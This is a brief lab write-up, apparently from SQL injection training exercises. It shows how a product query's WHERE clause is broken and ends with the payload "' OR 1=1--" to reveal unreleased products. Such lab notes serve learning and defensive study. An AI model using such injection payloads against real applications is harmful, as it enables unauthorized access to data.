Lab #1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

    Target Goal:
         Display all products both released and unreleased

    Analysis:
         
         SELECT * FROM products WHERE category='Gifts' AND released=1 (this will search for products in the category Gifts)
         SELECT * FROM products WHERE category=''' AND released=1 (this will give error due to the syntax of the query)
         SELECT * FROM products WHERE category=''--' AND released=1 ( after '--' this all query is ignored)
         SELECT * FROM products WHERE category='' OR 1=1--' AND released=1
